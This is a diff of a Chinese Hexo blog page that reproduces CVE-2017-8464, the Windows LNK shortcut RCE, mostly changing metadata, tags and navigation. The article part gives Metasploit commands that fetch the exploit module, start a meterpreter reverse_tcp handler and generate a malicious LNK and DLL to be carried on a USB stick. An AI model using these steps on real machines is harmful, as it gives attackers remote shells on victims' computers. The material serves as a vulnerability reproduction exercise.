@@ -68,11 +68,13 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Hexo, NexT,SuNu11" />
+  <meta name="keywords" content="CVE-2017-8464,漏洞复现," />
 
 
 
 
+
+  <link rel="alternate" href="/atom.xml" title="SuNu11'Blog" type="application/atom+xml" />
 
 
 
@@ -85,6 +87,7 @@
 
 
 <meta name="description" content="介绍名称：CVE-2017-8464 LNK文件（快捷方式）远程代码执行漏洞 概要：攻击者可以通过可移动驱动器（U盘）或远程共享等方式将包含恶意LNK文件和与之相关">
+<meta name="keywords" content="CVE-2017-8464,漏洞复现">
 <meta property="og:type" content="article">
 <meta property="og:title" content="LNK文件（快捷方式）远程代码执行漏洞（复现）">
 <meta property="og:url" content="http://sunu11.com/2017/08/29/17/index.html">
@@ -93,7 +96,7 @@
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://ofum8yjv2.bkt.clouddn.com/q-21.png">
 <meta property="og:image" content="http://ofum8yjv2.bkt.clouddn.com/q-22.png">
-<meta property="og:updated_time" content="2017-08-29T13:26:00.000Z">
+<meta property="og:updated_time" content="2018-02-26T04:44:55.026Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="LNK文件（快捷方式）远程代码执行漏洞（复现）">
 <meta name="twitter:description" content="介绍名称：CVE-2017-8464 LNK文件（快捷方式）远程代码执行漏洞 概要：攻击者可以通过可移动驱动器（U盘）或远程共享等方式将包含恶意LNK文件和与之相关">
@@ -377,7 +380,7 @@
 <p>首先kali下载exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd /opt</div><div class="line">Wget   https://raw.githubusercontent.com/ykoster/metasploit-framework/169e00bf3442447324df064192db62cdc5b5b860/modules/exploits/windows/fileformat/cve_2017_8464_lnk_rce.rb</div></pre></td></tr></table></figure></p>
 <p>  copy exp到/usr/share/metasploit-framework/modules/exploit/windows/smb/目录下<br><code>cp  cve_2017_8464_lnk_rce.rb  /usr/share/metasploit-framework/modules/exploits/windows/smb/</code></p>
 <p>生成监听shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/multi/handler   使用exploit/multi/handler监听连入的backdoor</div><div class="line">msf exploit(handler) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp 设置对应的payload</div><div class="line">msf exploit(handler) &gt; set LHOST 192.168.86.180</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/multi/handler   使用exploit/multi/handler监听连入的backdoor</div><div class="line">msf exploit(handler) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp 设置对应的payload</div><div class="line">msf exploit(handler) &gt; set LHOST 192.168.86.180</div><div class="line">msf exploit(handler) &gt; exploit -j</div></pre></td></tr></table></figure>
 <p>生成.LNK文件</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">use exploit/windows/smb/cve_2017_8464_lnk_rce</div><div class="line">msf exploit(cve_2017_8464_lnk_rce) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp</div><div class="line">msf exploit(cve_2017_8464_lnk_rce) &gt; set LHOST 192.168.86.180</div><div class="line">msf exploit(cve_2017_8464_lnk_rce) &gt; exploit</div></pre></td></tr></table></figure>
 <p>将生成的dll文件和以U盘盘符结尾的.LNK文件复制到U盘中；当插入U盘至主机，在靶机上双击.LNK文件，即可触发dll文件建立连接。</p>
@@ -387,7 +390,15 @@
 
       
     </div>
-
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+      
+    </div> 
     <div>
       
         
@@ -430,13 +441,21 @@
 
     <footer class="post-footer">
       
+        <div class="post-tags">
+          
+            <a href="/tags/CVE-2017-8464/" rel="tag"><i class="fa fa-tag"></i> CVE-2017-8464</a>
+          
+            <a href="/tags/漏洞复现/" rel="tag"><i class="fa fa-tag"></i> 漏洞复现</a>
+          
+        </div>
+      
 
       
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/08/29/16/" rel="next" title="msfvenom生成payload方法">
-                <i class="fa fa-chevron-left"></i> msfvenom生成payload方法
+              <a href="/2017/08/29/16/" rel="next" title="msfvenom生成payload的方法">
+                <i class="fa fa-chevron-left"></i> msfvenom生成payload的方法
               </a>
             
           </div>
@@ -444,6 +463,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/01/26/18/" rel="prev" title="内网渗透之反弹shell的几种姿势">
+                内网渗透之反弹shell的几种姿势 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -515,7 +538,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives/index.html">
-              <span class="site-state-item-count">17</span>
+              <span class="site-state-item-count">18</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -523,7 +546,7 @@
           
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-count">8</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -532,7 +555,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">16</span>
+                <span class="site-state-item-count">20</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
@@ -540,6 +563,13 @@
 
         </nav>
 
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
         
 
         <div class="links-of-author motion-element">
@@ -643,7 +673,7 @@
         <div class="copyright" >
   
   &copy;  2016 - 
-  <span itemprop="copyrightYear">2017</span>
+  <span itemprop="copyrightYear">2018</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
